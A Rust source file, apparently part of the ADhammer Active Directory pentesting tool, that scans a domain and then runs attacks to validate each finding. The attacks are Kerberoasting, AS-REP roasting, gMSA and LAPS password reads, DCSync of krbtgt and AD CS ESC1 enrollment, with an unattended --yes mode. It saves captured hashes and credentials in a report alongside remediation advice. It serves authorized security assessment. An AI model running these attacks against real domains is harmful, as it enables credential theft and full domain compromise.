//! Guided exploitation: scan → correlate findings → for each weakness ask the operator
//! "validate + capture a PoC?" → run the matching attack → collect evidence → write a report.
//!
//! Declined and non-auto-validatable findings still land in the report (documented, not
//! exercised), so the deliverable is the complete picture. Terminal output is colored via `ui`;
//! the report is Markdown with the exact command + captured proof per validated finding.

use crate::ui;
use adhammer_checks::run_all;
use adhammer_collector::{Collector, LdapConfig};
use adhammer_core::finding::{Category, Finding, Severity};
use adhammer_core::snapshot::Snapshot;
use adhammer_graph::ControlGraph;
use anyhow::{Context, Result};
use dialoguer::Confirm;
use std::process::Command;

pub struct GuidedArgs {
    pub url: String,
    pub user: String,
    pub password: String,
    pub insecure: bool,
    pub host: Option<String>,
    pub domain: Option<String>,
    pub realm: Option<String>,
    pub kdc: Option<String>,
    pub out: String,
    /// Validate every finding without prompting (unattended runs).
    pub yes: bool,
    /// Skip the per-finding **Impact:** attack-chain narrative in the Markdown report.
    /// The interactive card still shows it either way.
    pub no_impact: bool,
}

/// Everything a validator needs to build an attack invocation.
struct Ctx {
    url: String,
    user: String,
    password: String,
    insecure: bool,
    host: String,
    domain: String,
    realm: String,
    kdc: String,
    ca: Option<String>,
}

impl Ctx {
    /// Bare sAMAccountName for RPC/SMB validators (DRSUAPI, AD CS): the LDAP bind identity may be
    /// a UPN (`user@realm`) or `DOMAIN\user`, but NTLM/Kerberos over SMB wants the plain name plus
    /// a separate `--domain`.
    fn sam_user(&self) -> String {
        if let Some((_, s)) = self.user.split_once('\\') {
            s.to_string()
        } else if let Some((s, _)) = self.user.split_once('@') {
            s.to_string()
        } else {
            self.user.clone()
        }
    }
}

enum Outcome {
    Validated { cmd: String, evidence: String },
    Attempted { cmd: String, evidence: String },
    Declined,
    Potential,
}

pub async fn guided(a: GuidedArgs) -> Result<()> {
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };

    let sp = ui::Spinner::start("collecting AD objects + correlating findings");
    let mut c = Collector::connect(&cfg).await?;
    let ca = c
        .read_cas()
        .await
        .ok()
        .and_then(|v| v.into_iter().next().map(|(n, _)| n));
    let snap = c.collect().await?;
    let graph = ControlGraph::build(&snap);
    let paths = graph.paths_to_tier0();
    let findings = run_all(&snap, &graph); // already sorted by score, desc
    sp.done(&format!(
        "{} objects · {} findings · {} control-path(s) to Tier-0",
        snap.objects.len(),
        findings.len(),
        paths.len()
    ));

    let ctx = Ctx {
        url: a.url.clone(),
        user: a.user.clone(),
        password: a.password.clone(),
        insecure: a.insecure,
        host: a.host.clone().unwrap_or_else(|| url_host(&a.url)),
        domain: a
            .domain
            .clone()
            .or_else(|| snap.domain.netbios.clone())
            .unwrap_or_else(|| netbios_from_dn(&snap.domain.domain_dn)),
        realm: a
            .realm
            .clone()
            .unwrap_or_else(|| dns_from_dn(&snap.domain.domain_dn).to_uppercase()),
        kdc: a
            .kdc
            .clone()
            .unwrap_or_else(|| a.host.clone().unwrap_or_else(|| url_host(&a.url))),
        ca,
    };

    ui::header(&format!(
        "Guided validation — {} finding(s) on {}",
        findings.len(),
        ctx.realm
    ));
    if a.yes {
        ui::info("--yes: validating every finding with an available PoC");
    }

    let exe = std::env::current_exe().context("locate adhammer binary")?;
    let mut results: Vec<(Finding, Outcome)> = Vec::new();

    for f in findings {
        print_card(&f);
        let outcome = match validator(&f, &ctx) {
            None => {
                ui::info("no automated validator — recorded as potential");
                Outcome::Potential
            }
            Some((label, argv, marker)) => {
                let run = a.yes
                    || Confirm::new()
                        .with_prompt(format!("  validate «{label}» and capture a PoC?"))
                        .default(false)
                        .interact()
                        .unwrap_or(false);
                if !run {
                    ui::info("skipped — recorded as potential (not exercised)");
                    Outcome::Declined
                } else {
                    let sp = ui::Spinner::start(format!("running {label}"));
                    let cmd = format!("adhammer {}", argv.join(" "));
                    match Command::new(&exe).args(&argv).output() {
                        Ok(o) => {
                            // Confirm the *specific* proof is present, not just exit 0 — e.g. an
                            // actual `$krb5tgs$` hash, an ISSUED cert. Check the full (untruncated)
                            // output so evidence truncation can't cause a false negative.
                            let full = full_out(&o.stdout, &o.stderr);
                            let confirmed =
                                o.status.success() && (marker.is_empty() || full.contains(marker));
                            let ev = truncate(&full);
                            if confirmed {
                                sp.done("validated — PoC captured");
                                Outcome::Validated { cmd, evidence: ev }
                            } else {
                                sp.done_warn("attempted — proof not found (see report)");
                                Outcome::Attempted { cmd, evidence: ev }
                            }
                        }
                        Err(e) => {
                            sp.done_warn(&format!("could not run: {e}"));
                            Outcome::Attempted {
                                cmd,
                                evidence: format!("failed to spawn: {e}"),
                            }
                        }
                    }
                }
            }
        };
        results.push((f, outcome));
    }

    // Opportunistic active checks that aren't part of the passive scan (network/ADCS). Each runs
    // a read/probe and only becomes a report finding when a weakness is actually confirmed.
    println!();
    ui::header("Active checks (beyond the passive scan)");

    // LAPS local-admin read across the estate.
    {
        let mut argv = vec!["attack".to_string(), "laps".into()];
        argv.extend(ldap_args(&ctx));
        if a.yes || confirm("read LAPS local-admin passwords across the estate?") {
            let sp = ui::Spinner::start("LAPS local-admin read");
            let cmd = format!("adhammer {}", argv.join(" "));
            match Command::new(&exe).args(&argv).output() {
                Ok(o) => {
                    let full = full_out(&o.stdout, &o.stderr);
                    // Success = at least one recovered credential row (HOST$<TAB>account<TAB>pw).
                    let hit =
                        o.status.success() && full.lines().any(|l| l.matches('\t').count() >= 2);
                    if hit {
                        sp.done("validated — LAPS credentials recovered");
                        results.push((
                            laps_finding(),
                            Outcome::Validated {
                                cmd,
                                evidence: truncate(&full),
                            },
                        ));
                    } else {
                        sp.done("no LAPS password readable — not exposed");
                    }
                }
                Err(e) => sp.done_warn(&format!("could not run: {e}")),
            }
        }
    }

    // AD CS ESC8 web-enrollment relay exposure.
    {
        let mut argv = vec!["enum".to_string(), "adcs".into()];
        argv.extend(ldap_args(&ctx));
        if a.yes || confirm("probe the CA(s) for ESC8 web-enrollment relay exposure?") {
            let sp = ui::Spinner::start("ADCS ESC8 web-enrollment probe");
            let cmd = format!("adhammer {}", argv.join(" "));
            match Command::new(&exe).args(&argv).output() {
                Ok(o) => {
                    let full = full_out(&o.stdout, &o.stderr);
                    let hit = o.status.success() && full.contains("exposes NTLM");
                    if hit {
                        sp.done("validated — ESC8 web enrollment exposed");
                        results.push((
                            esc8_finding(),
                            Outcome::Validated {
                                cmd,
                                evidence: truncate(&full),
                            },
                        ));
                    } else {
                        sp.done("no ESC8 web-enrollment exposure");
                    }
                }
                Err(e) => sp.done_warn(&format!("could not run: {e}")),
            }
        }
    }

    let (v, at, d, p) = tally(&results);
    println!();
    println!(
        "{}   {}   {}   {}",
        ui::green(&format!("✓ {v} validated")),
        ui::yellow(&format!("▲ {at} attempted")),
        ui::dim(&format!("◻ {d} declined")),
        ui::dim(&format!("◽ {p} potential"))
    );
    let report = build_report(&snap, &results, !a.no_impact);
    std::fs::write(&a.out, report).with_context(|| format!("write report {}", a.out))?;
    ui::ok(&format!("report written → {}", a.out));
    Ok(())
}

/// Map a finding to the attack that proves it (label + argv for the adhammer subcommand), or
/// `None` when there's no automated validator yet.
/// The shared `--url --user --password [--insecure]` block for LDAP-bound attacks.
fn ldap_args(c: &Ctx) -> Vec<String> {
    let mut v = vec![
        "--url".into(),
        c.url.clone(),
        "--user".into(),
        c.user.clone(),
        "--password".into(),
        c.password.clone(),
    ];
    if c.insecure {
        v.push("--insecure".into());
    }
    v
}

fn validator(f: &Finding, c: &Ctx) -> Option<(String, Vec<String>, &'static str)> {
    let ldap = || ldap_args(c);
    match f.id.as_str() {
        "P-AsrepRoast" | "P-KerberoastAdmin" => {
            let mut v = vec!["attack".into(), "roast".into()];
            v.extend(ldap());
            v.extend(["--kdc".into(), c.kdc.clone()]);
            // The specific proof differs: an AS-REP finding needs a $krb5asrep$ hash, a
            // Kerberoast one needs $krb5tgs$ — exit 0 alone isn't proof either fired.
            let marker = if f.id == "P-AsrepRoast" {
                "$krb5asrep$"
            } else {
                "$krb5tgs$"
            };
            Some(("Kerberoast / AS-REP roast".into(), v, marker))
        }
        "P-GmsaRead" => {
            let target = affected_sam(f)?;
            let mut v = vec!["attack".into(), "gmsa".into()];
            v.extend(ldap());
            v.extend(["--target".into(), target]);
            Some(("gMSA managed-password read".into(), v, "NT hash recovered"))
        }
        "P-DcsyncPath" => {
            let v = vec![
                "attack".into(),
                "dcsync".into(),
                "--host".into(),
                c.host.clone(),
                "--domain".into(),
                c.domain.clone(),
                "--user".into(),
                c.sam_user(),
                "--password".into(),
                c.password.clone(),
                "--target".into(),
                "krbtgt".into(),
            ];
            Some(("DCSync (replicate krbtgt secret)".into(), v, "krbtgt:"))
        }
        "A-Esc1" => {
            let ca = c.ca.clone()?; // need a known CA
            let template = f.affected.first()?.clone();
            let v = vec![
                "attack".into(),
                "esc1".into(),
                "--host".into(),
                c.host.clone(),
                "--domain".into(),
                c.domain.clone(),
                "--user".into(),
                c.sam_user(),
                "--password".into(),
                c.password.clone(),
                "--ca".into(),
                ca,
                "--template".into(),
                template,
                "--upn".into(),
                format!("{}@{}", c.sam_user(), c.realm.to_lowercase()),
            ];
            Some((
                "AD CS ESC1 (enroll a cert as the target)".into(),
                v,
                "ISSUED",
            ))
        }
        _ => None,
    }
}

fn confirm(prompt: &str) -> bool {
    Confirm::new()
        .with_prompt(format!("  {prompt}"))
        .default(false)
        .interact()
        .unwrap_or(false)
}

/// Synthetic finding for a confirmed LAPS local-admin read (not a passive-scan rule).
fn laps_finding() -> Finding {
    Finding {
        id: "X-LapsRead".into(),
        title: "LAPS local-admin password readable".into(),
        category: Category::PrivilegedAccounts,
        severity: Severity::Critical,
        mitre: vec![adhammer_core::finding::mitre::VALID_ACCOUNTS],
        affected: vec![],
        detail: "A LAPS-managed local administrator password was readable with the current identity — instant local admin, reusable for lateral movement.".into(),
        impact: None,
        remediation: "Restrict read access to ms-Mcs-AdmPwd / msLAPS-Password to tier-appropriate admins; deploy encrypted (DPAPI-NG) LAPS.".into(),
        weight_bonus: 0,
    }
}

/// Synthetic finding for a confirmed ESC8 web-enrollment relay exposure.
fn esc8_finding() -> Finding {
    Finding {
        id: "X-Esc8".into(),
        title: "AD CS ESC8 — web-enrollment relay exposure".into(),
        category: Category::Anomalies,
        severity: Severity::Critical,
        mitre: vec![adhammer_core::finding::mitre::CERT_ABUSE],
        affected: vec![],
        detail: "A CA exposes HTTP web enrollment with NTLM over cleartext — a coerced machine's NTLM can be relayed to it for a cert, then PKINIT for that machine's TGT.".into(),
        impact: None,
        remediation: "Disable HTTP web enrollment or require HTTPS + Extended Protection (EPA); enforce SMB/LDAP signing to blunt the relay.".into(),
        weight_bonus: 0,
    }
}

/// First affected entry that looks like a sAMAccountName (`name$` or a bare name, not a SID/DN).
fn affected_sam(f: &Finding) -> Option<String> {
    f.affected
        .iter()
        .map(|a| a.split([' ', '\t']).next().unwrap_or(a).trim().to_string())
        .find(|s| !s.is_empty() && !s.starts_with("S-1-") && !s.contains('='))
}

/// Full combined stdout+stderr (untruncated) — the success-marker is checked against this so
/// evidence truncation can never cause a false negative.
fn full_out(stdout: &[u8], stderr: &[u8]) -> String {
    let mut s = String::from_utf8_lossy(stdout).into_owned();
    let e = String::from_utf8_lossy(stderr);
    if !e.trim().is_empty() {
        s.push('\n');
        s.push_str(&e);
    }
    s.trim().to_string()
}

/// Truncate captured evidence for the report (char-boundary-safe).
fn truncate(s: &str) -> String {
    if s.len() <= 6000 {
        return s.to_string();
    }
    let mut end = 6000;
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}\n… (truncated)", &s[..end])
}

fn tally(r: &[(Finding, Outcome)]) -> (usize, usize, usize, usize) {
    let mut t = (0, 0, 0, 0);
    for (_, o) in r {
        match o {
            Outcome::Validated { .. } => t.0 += 1,
            Outcome::Attempted { .. } => t.1 += 1,
            Outcome::Declined => t.2 += 1,
            Outcome::Potential => t.3 += 1,
        }
    }
    t
}

// ---- presentation ---------------------------------------------------------------------

fn sev_tag(s: Severity) -> String {
    match s {
        Severity::Critical => ui::red("[CRITICAL]"),
        Severity::High => ui::yellow("[HIGH]"),
        Severity::Medium => ui::accent("[MEDIUM]"),
        Severity::Low => ui::dim("[LOW]"),
        Severity::Info => ui::dim("[INFO]"),
    }
}

fn cat_str(c: Category) -> &'static str {
    match c {
        Category::PrivilegedAccounts => "Privileged Accounts",
        Category::Trusts => "Trusts",
        Category::StaleObjects => "Stale Objects",
        Category::Anomalies => "Anomalies",
    }
}

fn mitre_str(f: &Finding) -> String {
    f.mitre
        .iter()
        .map(|m| format!("{} {}", m.id, m.name))
        .collect::<Vec<_>>()
        .join(", ")
}

fn print_card(f: &Finding) {
    println!();
    println!("{} {}", sev_tag(f.severity), ui::accent(&f.title));
    ui::field("id", &f.id);
    ui::field("category", cat_str(f.category));
    if !f.mitre.is_empty() {
        ui::field("mitre", &mitre_str(f));
    }
    if !f.affected.is_empty() {
        let n = f.affected.len();
        let shown = f
            .affected
            .iter()
            .take(4)
            .cloned()
            .collect::<Vec<_>>()
            .join(", ");
        let extra = if n > 4 {
            format!(" (+{} more)", n - 4)
        } else {
            String::new()
        };
        ui::field("affected", &format!("{shown}{extra}"));
    }
    ui::field("why", &f.detail);
    if let Some(imp) = &f.impact {
        ui::field("impact", imp);
    }
}

// ---- report ---------------------------------------------------------------------------

fn build_report(snap: &Snapshot, results: &[(Finding, Outcome)], include_impact: bool) -> String {
    let (v, at, d, p) = tally(results);
    let mut s = String::new();
    s.push_str("# ADhammer — guided assessment report\n\n");
    s.push_str(&format!("**Domain:** `{}`\n\n", snap.domain.domain_dn));
    s.push_str(&format!(
        "**Summary:** {} finding(s) — **{v} validated (PoC)**, {at} attempted, {d} declined, {p} potential.\n\n",
        results.len()
    ));
    s.push_str("> Validated findings carry a reproducible PoC (exact command + captured output). ");
    s.push_str("Declined/potential findings are documented but were not exercised.\n\n");
    s.push_str("---\n\n");

    for (f, o) in results {
        let status = match o {
            Outcome::Validated { .. } => "✅ VALIDATED (PoC)",
            Outcome::Attempted { .. } => "⚠️ ATTEMPTED (not confirmed)",
            Outcome::Declined => "◻️ DECLINED (not exercised)",
            Outcome::Potential => "◽ POTENTIAL (no auto-validator)",
        };
        s.push_str(&format!(
            "## [{}] {} — {}\n\n",
            sev_word(f.severity),
            f.id,
            f.title
        ));
        s.push_str(&format!("- **Status:** {status}\n"));
        s.push_str(&format!("- **Category:** {}\n", cat_str(f.category)));
        if !f.mitre.is_empty() {
            s.push_str(&format!("- **MITRE ATT&CK:** {}\n", mitre_str(f)));
        }
        if !f.affected.is_empty() {
            s.push_str(&format!("- **Affected:** {}\n", f.affected.join(", ")));
        }
        s.push_str(&format!("- **Why:** {}\n", f.detail));
        if include_impact {
            if let Some(imp) = &f.impact {
                s.push_str(&format!("- **Impact:** {imp}\n"));
            }
        }
        s.push_str(&format!("- **Remediation:** {}\n\n", f.remediation));
        match o {
            Outcome::Validated { cmd, evidence } | Outcome::Attempted { cmd, evidence } => {
                s.push_str("**PoC**\n\n");
                s.push_str(&format!("```\n$ {cmd}\n```\n\n"));
                s.push_str("<details><summary>captured output</summary>\n\n");
                s.push_str(&format!("```\n{evidence}\n```\n\n</details>\n\n"));
            }
            _ => {}
        }
        s.push_str("---\n\n");
    }
    s.push_str("_Generated by ADhammer — authorized testing / research only._\n");
    s
}

fn sev_word(s: Severity) -> &'static str {
    match s {
        Severity::Critical => "CRITICAL",
        Severity::High => "HIGH",
        Severity::Medium => "MEDIUM",
        Severity::Low => "LOW",
        Severity::Info => "INFO",
    }
}

// ---- small derivations ----------------------------------------------------------------

fn url_host(url: &str) -> String {
    url.split("://")
        .nth(1)
        .unwrap_or(url)
        .split('/')
        .next()
        .unwrap_or("")
        .split(':')
        .next()
        .unwrap_or("")
        .to_string()
}

fn dns_from_dn(dn: &str) -> String {
    dn.split(',')
        .filter_map(|p| {
            let p = p.trim();
            p.strip_prefix("DC=").or_else(|| p.strip_prefix("dc="))
        })
        .collect::<Vec<_>>()
        .join(".")
}

fn netbios_from_dn(dn: &str) -> String {
    dn.split(',')
        .find_map(|p| {
            let p = p.trim();
            p.strip_prefix("DC=").or_else(|| p.strip_prefix("dc="))
        })
        .unwrap_or("")
        .to_uppercase()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn derivations() {
        assert_eq!(url_host("ldaps://192.168.10.1:636"), "192.168.10.1");
        assert_eq!(dns_from_dn("DC=testlab,DC=local"), "testlab.local");
        assert_eq!(netbios_from_dn("DC=testlab,DC=local"), "TESTLAB");
    }

    fn f(id: &str, affected: &[&str]) -> Finding {
        Finding {
            id: id.into(),
            title: "t".into(),
            category: Category::PrivilegedAccounts,
            severity: Severity::High,
            mitre: vec![],
            affected: affected.iter().map(|s| s.to_string()).collect(),
            detail: "d".into(),
            impact: None,
            remediation: "r".into(),
            weight_bonus: 0,
        }
    }

    #[test]
    fn affected_sam_skips_sid_and_dn() {
        assert_eq!(
            affected_sam(&f("x", &["S-1-5-21-1-2-3-513", "svc_sql$", "CN=x,DC=y"])).as_deref(),
            Some("svc_sql$")
        );
    }

    #[test]
    fn roast_and_dcsync_have_validators() {
        let c = Ctx {
            url: "ldaps://dc:636".into(),
            user: "administrator".into(),
            password: "p".into(),
            insecure: true,
            host: "dc".into(),
            domain: "CORP".into(),
            realm: "CORP.LOCAL".into(),
            kdc: "dc".into(),
            ca: None,
        };
        assert!(validator(&f("P-KerberoastAdmin", &[]), &c).is_some());
        assert!(validator(&f("P-DcsyncPath", &[]), &c).is_some());
        assert!(validator(&f("A-Esc1", &["User"]), &c).is_none()); // no CA known → no validator
        assert!(validator(&f("S-Inactive", &[]), &c).is_none());
    }

    #[test]
    fn sam_user_strips_upn_and_netbios_prefix() {
        let mk = |u: &str| Ctx {
            url: "ldaps://dc:636".into(),
            user: u.into(),
            password: "p".into(),
            insecure: true,
            host: "dc".into(),
            domain: "CORP".into(),
            realm: "CORP.LOCAL".into(),
            kdc: "dc".into(),
            ca: None,
        };
        assert_eq!(mk("administrator@corp.local").sam_user(), "administrator");
        assert_eq!(mk("CORP\\administrator").sam_user(), "administrator");
        assert_eq!(mk("administrator").sam_user(), "administrator");
    }
}
